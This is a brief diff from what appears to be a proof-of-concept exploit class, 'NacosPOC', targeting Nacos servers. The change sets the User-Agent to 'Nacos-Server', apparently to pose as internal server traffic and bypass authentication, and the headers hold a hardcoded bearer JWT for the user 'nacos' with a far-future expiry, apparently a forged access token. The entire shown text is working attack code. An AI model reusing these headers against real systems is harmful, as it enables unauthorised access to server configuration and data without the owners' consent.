@@ -7,7 +7,7 @@ class NacosPOC:
     def __init__(self, mode=0):
         self.mode = mode
         self.headers = {
-            "User-Agent": "Firefox/124.0",
+            "User-Agent": "Nacos-Server",
             "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuY"
                              "WNvcyIsImV4cCI6NDA4MTkwNzk5M30.BdQSxmoftt9zePaqO1-B9QFSi1t"
                              "siiQ2mzKUjnZfQJk"
